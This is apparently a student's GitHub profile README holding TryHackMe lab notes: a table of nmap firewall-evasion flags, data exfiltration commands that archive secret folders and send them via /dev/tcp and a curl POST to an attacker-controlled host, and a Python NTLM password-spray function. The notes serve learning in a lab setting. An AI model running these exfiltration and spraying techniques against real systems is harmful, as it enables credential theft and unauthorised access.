# Azalee

<picture>
 <img alt="Tryhackme" src="https://tryhackme.com/badge/635738">
</picture>

## About me

Hi, I'm Azalee. I am French systems and networks student, who loves cybersecurity !


<details>
<summary>My favorite hobbies ! </summary>


| Rank | hobbies |
|-----:|---------------|
|     1|   Learning cybersecurity            |
|     2|    listening to music            |
|     3|     learning English          |

</details>

# Firewall Evasion 

| Evasion Approach  | Nmap Argument |
| ------------- | ------------- |
| Hide a scan with decoys  | `-D DECOY1_IP1,DECOY_IP2,ME`  |
| Use an HTTP/SOCKS4 proxy to relay connections  | `--proxies PROXY_URL`  |
| Spoof source MAC address | `--spoof-mac MAC_ADDRESS` |
| Spoof source IP address	| `-S IP_ADDRESS` |
| Use a specific source port number |	`-g PORT_NUM or --source-port PORT_NUM` |
| Fragment IP data into 8 bytes |	`-f` |
| Fragment IP data into 16 bytes |	`-ff` |
| Fragment packets with given MTU |	`--mtu VALUE` |
| Specify packet length |	`--data-length NUM` |
| Set IP time-to-live field |	`--ttl VALUE` |
| Send packets with specified IP options |	`--ip-options OPTIONS` |
| Send packets with a wrong TCP/UDP checksum |	`--badsum` |
| Hide a scan with random decoys |	`-D RND,RND,ME` |

# Data Exfiltration

## TCP SOCKET

Make sure the listener is running on the attackerBox.

`tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080`

Let's break down the previous command and explain it:
1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.

On the AttackerBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back. 

`cd /tmp/`
`dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar`

1. We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command. 
2. The output of the dd command will be passed to the base64 to decode it using the -d argument.
3. Finally, we save the output in the task4-creds.tar  file.

Next, we need to use the tar command to unarchive the task4-creds.tar file and check the content as follows,

`tar xvf task4-creds.tar`

1. We used the tar command to unarchive the file with the xvf arguments.
2. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.

## HTTP TRANSFER

`curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php`

We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.

On the web. server check the tmp directory --> new file but seems broken, to fix : 

`sudo sed -i 's/ /+/g' /tmp/http.bs64`

Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!


`cat /tmp/http.bs64 | base64 -d | tar xvfz -`
`tmp/task6/`
`tmp/task6/creds.txt`

Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.

# Password Spray 
```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```
`python3 ntlm_passwordspray.py  -u username.txt -f [fqdn] -p [Password] -a http://URL
`
